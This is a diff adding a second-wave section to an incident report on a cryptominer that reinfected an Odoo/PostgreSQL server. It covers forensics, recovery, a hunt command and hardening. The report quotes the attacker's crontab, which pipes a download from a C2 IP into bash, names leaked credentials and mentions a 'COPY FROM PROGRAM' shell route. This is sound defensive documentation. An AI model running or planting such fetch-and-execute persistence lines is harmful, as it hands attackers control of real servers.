@@ -64,6 +64,41 @@ Full dump taken: `/root/odoo_all_2026-08-09_1827.sql.gz`.
 **Entry vector:** weak credentials in `/odoo/odoo17.conf` — `db_password = odoo17` (identical
 to the username), `admin_passwd = iconnect2024`, `list_db = True`, on a host that had ufw disabled.
 
+## 🚨 Re-infection — 2026-08-10 01:03 (second wave)
+Despite the Aug 9 cleanup (payloads removed, SSH backdoor key emptied at 18:21, C2 blocked),
+the attacker returned ~7 hours later with **new names and a new C2**:
+
+- Miner renamed **`unicorn`** (PID 168434, 452% CPU, same 2.41 GB RSS = XMRig), running as `postgres`
+- Second process **`worker`** (PID 168206) whose binary was **`/var/tmp/3ee3e175cd040787a926728366d4265a` (deleted)** —
+  executed then unlinked, so it exists only in memory and file scans miss it
+- New `postgres` crontab, new C2:
+  ```
+  @reboot        curl -s "http://31.77.227.130:6556/ok" | base64 -d | bash
+  */3 * * * *    curl -s "http://31.77.227.130:6556/ok" | base64 -d | bash
+  ```
+- All 7 Odoo databases swept for malicious `ir_cron` — **clean**, so the DB route wasn't reused
+
+**Collateral damage:** the malware wiped `/dev/shm`, destroying PostgreSQL's dynamic shared-memory
+segments → `FATAL: could not open shared memory segment "/PostgreSQL.*"` → Odoo showed "no database".
+Worse, `worker` was stuck inside the `postgresql@16-main` **cgroup**, leaving the unit in
+`deactivating (stop-sigterm)` so every restart hung.
+
+**Recovery:** `systemctl kill -s SIGKILL postgresql@16-main` → `systemctl reset-failed` → start.
+Shutdown had been clean (`checkpoint complete` / `database system is shut down`) — **no corruption**,
+all 7 databases intact.
+
+**Hunt command for this malware family** (finds processes whose binary was deleted):
+```bash
+ls -l /proc/*/exe 2>/dev/null | grep -i deleted
+```
+
+**Hardening applied 2026-08-10:** `db_password` rotated in PostgreSQL **and** `/odoo/odoo17.conf`
+(verified — all 7 DBs reconnect, cron jobs run); `admin_passwd` changed off `iconnect2024`.
+Odoo must stay publicly reachable (owner logs in daily), so instead of closing port 8070 the plan
+is: put it behind `odoo.iconnect-intl.com` with nginx + Let's Encrypt, then close the raw port.
+Also consider `ALTER USER odoo17 NOSUPERUSER` — superuser is what lets a web-level compromise run
+`COPY … FROM PROGRAM` and get a shell as the `postgres` OS user (the account every miner ran under).
+
 ### ❗ Still owed by the owner
 1. Rotate the PostgreSQL password off `odoo17` (DB **and** `/odoo/odoo17.conf`)
 2. Change `admin_passwd`; set `list_db = False`
